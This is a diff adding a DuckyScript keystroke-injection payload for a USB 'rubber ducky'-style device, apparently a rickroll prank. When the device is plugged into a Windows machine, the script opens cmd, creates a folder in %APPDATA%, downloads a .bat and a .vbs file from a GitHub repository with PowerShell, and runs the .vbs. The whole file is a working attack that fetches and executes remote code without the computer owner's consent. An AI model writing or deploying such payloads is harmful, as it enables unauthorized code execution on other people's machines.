@@ -1,0 +1,32 @@
+CTRL ESC
+DELAY 300
+STRING cmd
+DELAY 200
+ENTER
+DELAY 300
+STRING mkdir %APPDATA%\rickroll_files
+DELAY 100
+ENTER
+DELAY 200
+STRING cd %APPDATA%\rickroll_files
+DELAY 100
+ENTER
+DELAY 200
+STRING powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oakchris1955/pico_ducky_rickroll/main/rickroll_files/main.bat -OutFile main.bat
+DELAY 100
+ENTER
+DELAY 200
+STRING powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oakchris1955/pico_ducky_rickroll/main/rickroll_files/main.vbs -OutFile main.vbs
+DELAY 100
+ENTER
+DELAY 200
+STRING main.vbs
+DELAY 100
+ENTER
+DELAY 150
+STRING exit
+DELAY 100
+ENTER
+LED
+DELAY 5000
+LED
